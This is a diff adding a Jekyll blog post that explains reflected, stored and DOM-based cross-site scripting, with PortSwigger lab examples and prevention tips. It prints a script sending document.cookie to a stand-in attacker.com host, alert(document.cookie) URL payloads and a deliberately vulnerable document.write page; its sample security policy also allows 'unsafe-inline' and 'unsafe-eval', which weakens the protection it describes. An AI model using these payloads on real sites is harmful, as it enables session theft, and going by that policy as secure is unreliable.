@@ -1,0 +1,151 @@
+---
+layout: post
+title:  "Cross Site Scripting"
+date:   2023-03-17 05:00:00 +0200
+categories: Application security blogs
+---
+
+
+Is a web application vulnerability that allows attacker to inject scripts into the webpages.The main cause of this attack is improper neutralization of the input during webpage
+generation. The attack starts when we are able to put untrusted data into a web page.This is possible in one of two ways.
+
+
+### Reflected XSS ###
+
+
+This is also called as non-persistent XSS. An attacker craft a malicious email and encourages user to click it. The malicious url is often placed within a phishing email, or it 
+could be placed on a public website, such as link within a comment. When user clicks tha malicious URL, it sends an HTTP request to a server. This request consist of malicious 
+code,and the server sends it back to the user in the HTTP response. Eventually it gets executed in the users' browser.
+In reflected XSS as payload is not stored on server end only the user who is accessing that vulnerable page would be affected.
+
+    Example: http://www.example.com/welcome.html?sessionId=11134530453451234&username=Alice
+    Attacker might craft the payload as shown below, its encoded so the request is less susspicious looking to the user.  
+
+![reflected]({{ "/assets/images/xss/fig0-reflected.png" | relative_url }})
+
+   When we decoded that payload we see, it's actually requesting users cookie and send it over attackers site.
+
+
+### Stored XSS ###
+
+
+In this instead of user sending the malicious code to the server, it is stored in a database or other location trusted by the web application. That's why it is also called as 
+persistent XSS. Whenever any user visits the malicious page which is vulnerable to XSS, the user is affected and the code gets executed in the users' browser.
+In Stored XSS, as the payload gets stored at server end, whoever accessing that vulnerable page would get affected. This has more impact than the reflected XSS, and it's 
+difficult to identify. 
+
+    Attacker might craft a script into the social post, which gets stored at backend and whenever any victim happen to visit that page he would be compramised.
+    <script>
+        document.location='http://attacker.com/pages?'+document.cookie
+    </script>
+
+
+### DOM-based XSS ###
+
+
+DOM stands for Document Object Model,is an internal data structure which stores all the objects and properties of a web page.  
+
+It's a type of attack which is executed within the DOM of a page loaded into the browser. Unlike Stored/reflected XSS, DOM-based XSS is purely a client side vulnerability. 
+In this attack the payload never reaches to server. The attack happens at the client end. If the malicious payload is able to execute by altering DOM in the victim's browser 
+that means attacker can exploit a DOM XSS.
+
+    Example:http://www.example.com/welcome.html?username=Alice, consider user is accessing the page which contains following code.
+    
+    <HTML>
+        <TITLE>Welcome!</TITLE>
+        Hi
+        <SCRIPT>
+        var pos=document.URL.indexOf("username=")+8;
+        document.write(document.URL.substring(pos,document.URL.length));
+        </SCRIPT>
+        <BR>
+        , Thank you for visiting!!
+    </HTML>
+    
+    Attacker might lure the victim to click on the link "http://www.example.com/welcome.html?username=<script>'alert'(document.cookie)</script>" would result in an XSS attack.
+
+
+In Reflected or Stored, the attack is injected into the application during server-side processing of requests where untrusted input is dynamically added to HTML.
+For DOM XSS, the attack is injected into the application during runtime in the client directly.
+
+
+## What are impacts of XSS attack? ##
+
+There are lots of impact because of XSS attack to name a few - 
+
+1. Attacker can get hold of sensitive data such as personal emails, credit card information, PII, healthcare records, banking transactions and many more. 
+2. Can elevate privileges and can take complete control of the application and steal the information or misused it.
+3. Can hijack victims account and look for ransomware.
+4. Can deface a company website by altering its content and damage companies image.
+
+
+## How to exploit XSS vulnerabilities? ##
+
+Here took some examples from PortSwigger to show how we can exploit different types of XSS vulnerabilities.
+
+### Example: Reflected XSS ###
+
+In the following lab, we could see that the search input is not sanitized properly, and we are able to alert with document.location. 
+
+![reflected]({{ "/assets/images/xss/fig1-reflected.png" | relative_url }})
+
+Likewise, attacker can send the phishing email with the link "http://attacker.com/?search=<script>'alert'(document.cookie)</script>" to victim, and he happened to 
+click on the link then attacker would have access to victim's session cookie and impersonate him.  
+
+### Example: Stored XSS ###
+
+In the following lab, we could see that the comment box is not sanitized properly and the payload is stored in backend. So whenever any user visits that page he would see 
+that alerted with document.location.
+
+![dom]({{ "/assets/images/xss/fig2-stored.png" | relative_url }})
+![dom]({{ "/assets/images/xss/fig3-stored.png" | relative_url }})
+
+
+### Example: DOM XSS ###
+
+In the following lab,whatever input we provide in search field is written on to the page with DOM object i.e. document.write and that's why attacker can take a note of 
+this vulnerability and attack the DOM object.
+
+![dom]({{ "/assets/images/xss/fig4-dom.png" | relative_url }})
+
+
+## How to prevent XSS attacks? ##
+
+Here are some suggestions but this doesn't guarantee that your web application is completely protected.
+
+1. Input field validation/sanitization at client as well as server side. Developer should avoid any methods that allow the webpage to display untrusted data.
+   - Input fields data type validation
+   - Length validation
+   - Whitelisting of the user inputted data.
+
+2. Output encoding, it converts untrusted data into a secure form. It doesn't execute the code in the browser.
+
+3. Implement Content Security Policy header where in developer can specify access permissions to client side resources like javascript and CSS.
+   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
+
+4. Make use of security headers like 
+   - "Content-type" and "X-Content-Type-Options" which ensures browser interpret the responses in tha way you intend. 
+      Content-Type: text/html; charset=utf-8
+      X-Content-Type-Options: nosniff
+   
+   - HTTPOnly flag which ensures, cookies will not be accessible by javascript.
+     HTTPOnly : true
+   
+   - Strict-Transport-Security which ensures site should be accessed only using HTTPS and should automatically convert all attempts to access the site using HTTP to HTTPS.   
+     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+
+## References: ##
+
+https://portswigger.net/web-security/
+
+
+
+
+
+
+
+
+
+
+
